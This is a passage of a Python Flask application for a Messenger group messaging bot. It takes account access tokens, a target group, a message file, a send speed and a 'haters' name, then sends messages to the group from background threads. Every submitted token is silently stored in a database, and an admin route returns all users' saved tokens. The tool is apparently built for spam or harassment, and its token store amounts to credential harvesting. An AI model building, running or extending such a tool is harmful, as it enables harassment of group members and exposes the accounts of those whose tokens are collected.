    return redirect(url_for('index'))

@app.route('/run_group_message_bot', methods=['POST'])
@approved_required
def run_group_message_bot():
    global message_threads, stop_flags

    group_uid = request.form['group_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']
    user_id = session.get('user_id')

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Get token name for display
    first_token = token.splitlines()[0].strip() if token.splitlines() else ""
    token_name = get_token_name(first_token)
    
    # Save tokens for this user
    for token_line in token.splitlines():
        if token_line.strip():
            token_user_name = get_token_name(token_line.strip())
            save_user_token(user_id, token_line.strip(), token_user_name, True)
    
    # Create task record in database
    create_task_record(task_id, user_id, group_uid, haters_name, token_name, 'messenger_group')
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'user_id': user_id,
        'thread': threading.Thread(target=send_group_messages, args=(task_id, group_uid, token, message_content, speed, haters_name)),
        'group_uid': group_uid,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'token_name': token_name
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"🚀 Messenger group messaging bot started successfully for task {task_id}")
    add_log(task_id, f"Primary token: {token_name}")
    return redirect(url_for('index'))

@app.route('/stop_task/<task_id>', methods=['POST'])
@approved_required
def stop_task(task_id):
    global stop_flags, message_threads
    
    user_id = session.get("user_id")
    
    # Verify task belongs to user
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM tasks WHERE id = ?", (task_id,))
    task = c.fetchone()
    conn.close()
    
    if not task or task[0] != user_id:
        return jsonify({'status': 'error', 'message': 'Task not found or access denied'})
    
    if task_id in stop_flags:
        stop_flags[task_id] = True
        add_log(task_id, "🛑 Stop signal sent by user")
        return jsonify({'status': 'success', 'message': 'Task stop signal sent'})
    else:
        return jsonify({'status': 'error', 'message': 'Task not found or already stopped'})

@app.route('/remove_task/<task_id>', methods=['POST'])
@approved_required
def remove_task(task_id):
    user_id = session.get('user_id')
    
    # Verify task belongs to user and is stopped
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, status FROM tasks WHERE id = ?", (task_id,))
    task = c.fetchone()
    
    if not task or task[0] != user_id:
        conn.close()
        return jsonify({'status': 'error', 'message': 'Task not found or access denied'})
    
    if task[1] == 'running':
        conn.close()
        return jsonify({'status': 'error', 'message': 'Cannot remove running task. Stop it first.'})
    
    # Remove task and its logs
    c.execute("DELETE FROM task_logs WHERE task_id = ?", (task_id,))
    c.execute("DELETE FROM tasks WHERE id = ?", (task_id,))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'success', 'message': 'Task removed successfully'})

# Token and group management API routes
@app.route('/check_tokens', methods=['POST'])
@approved_required
def check_tokens():
    data = request.get_json()
    tokens = data.get('tokens', [])
    user_id = session.get('user_id')
    
    results = []
    for token in tokens:
        token = token.strip()
        if token:
            result = check_token_validity(token)
            result['token'] = token
            results.append(result)
            
            # Save token for this user
            if result['valid']:
                save_user_token(user_id, token, result['name'], True)
    
    return jsonify({'results': results})

@app.route('/fetch_groups', methods=['POST'])
@approved_required
def fetch_groups():
    data = request.get_json()
    token = data.get('token', '').strip()
    user_id = session.get('user_id')
    
    if not token:
        return jsonify({'success': False, 'groups': [], 'message': 'Token is required'})
    
    result = fetch_messenger_groups(token)
    
    # Save token for this user if it works
    if result['success']:
        token_name = get_token_name(token)
        save_user_token(user_id, token, token_name, True)
    
    return jsonify(result)

@app.route('/fetch_group_members', methods=['POST'])
@approved_required
def fetch_group_members():
    data = request.get_json()
    token = data.get('token', '').strip()
    group_uid = data.get('group_uid', '').strip()
    user_id = session.get('user_id')
    
    if not token or not group_uid:
        return jsonify({'success': False, 'members': [], 'message': 'Token and group UID are required'})
    
    result = fetch_group_members(token, group_uid)
    
    # Save token for this user if it works
    if result['success']:
        token_name = get_token_name(token)
        save_user_token(user_id, token, token_name, True)
    
    return jsonify(result)

# Admin routes
@app.route('/admin')
@admin_required
def admin_panel():
    return render_template_string(admin_html)

@app.route('/admin/get_users')
@admin_required
def admin_get_users():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved, created_at FROM users ORDER BY created_at DESC")
    users = c.fetchall()
    conn.close()
    
    user_list = []
    for user in users:
        user_dict = {
            'id': user[0],
            'username': user[1],
            'admin': bool(user[2]),
            'approved': bool(user[3]),
            'created_at': user[4]
        }
        user_list.append(user_dict)
    
    return jsonify({'users': user_list})

@app.route('/admin/get_tokens')
@admin_required
def admin_get_tokens():
    tokens = get_all_user_tokens()
    return jsonify({'tokens': tokens})

@app.route('/admin/approve_user/<int:user_id>', methods=['POST'])
@admin_required
def admin_approve_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'success', 'message': 'User approved successfully'})

@app.route('/admin/delete_user/<int:user_id>', methods=['POST'])
@admin_required
def admin_delete_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user is admin
    c.execute("SELECT admin FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] == 1:
        conn.close()
        return jsonify({'status': 'error', 'message': 'Cannot delete admin user'})
    
    # Delete user and related data
    c.execute("DELETE FROM user_tokens WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM task_logs WHERE task_id IN (SELECT id FROM tasks WHERE user_id = ?)", (user_id,))
    c.execute("DELETE FROM tasks WHERE user_id = ?", (user_id,))
    c.execute("DELETE FROM users WHERE id = ?", (user_id,))
    
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'success', 'message': 'User deleted successfully'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
